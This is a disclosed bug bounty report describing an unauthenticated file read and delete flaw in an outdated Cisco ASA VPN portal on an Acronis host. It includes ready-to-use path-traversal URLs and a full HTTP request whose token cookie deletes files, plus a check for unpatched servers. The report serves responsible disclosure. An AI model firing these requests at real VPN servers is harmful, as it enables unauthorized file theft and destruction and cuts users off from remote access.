# Local File Disclosure /Delete On [us-az-vpn.acronis.com]

## Report Details
- **Report ID**: 924407
- **URL**: https://hackerone.com/reports/924407
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-15T13:01:14.953Z
- **Disclosed**: 2021-06-22T14:47:39.234Z

## Reporter
- **Username**: 10nf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Cisco ASA VPN server hosted on

* https://us-az-vpn.acronis.com


was found to be using an outdated version that suffers from a Local File Disclosure /Delete vulnerability. Through this vulnerability an unauthenticated remote attacker can read and delete the contents of any file stored on the VPN server without authentication; including the VPN "lua" source code files .
This vulnerability can delete any file and break the vpn , so it should be carefully tested
The files will be restored after VPN restart


##Technical details:
### Affected Endpoint for delete :

* https://us-az-vpn.acronis.com/+CSCOE+/session_password.html


```Affected Cookie Parameter: token```
```Request Method: GET```

### Affected Endpoint for read files:

* https://us-az-vpn.acronis.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../

```Affected Cookie Parameter: textdomain```
```Request Method: GET```
{F908308}


This vulnerability is critical and can't be tested on production environment as it will break the VPN by deleting any file , so I tested on local environment .

We need to verify that the vulnerability exists :

* Firstly I downloaded the vulnerable code and compared it with the code from local environment , and they were identical
{F908308}
* Secondly, When this path exists +CSCOE+/session_password.html this means the vulnerability isn't patched , and if the response is 404 that means the vulnerability is patched

{F908309}

# Exploiting the vulnerability on local environment :
* Trying to download a file :
```
https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
```
{F908307}

* Exploit the vulnerability using this request :
```
GET /+CSCOE+/session_password.html HTTP/1.1
Host: 192.168.1.100
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Cookie: token=../../../../../../+CSCOE+/wrong_url.html
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

The file is read and stored in webvpn cookie and then deleted 
{F908305}

* Trying to read the file again after delete :

```
https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
```

{F908306}

## Impact

The vulnerability allows a remote unauthenticated attacker to read and download files from Cisco ASA VPN server, thus an attacker can use the vulnerability to read and delete internal files from the server such as:

* The VPN's LUA source code files
* Delete any file
* Break the vpn web portal
* Prevent users from authenticate via web portal

## Attachments
- delete_file.png
- file_after_delete.png
- file_before_delete.png
- lfd.png
- password.png
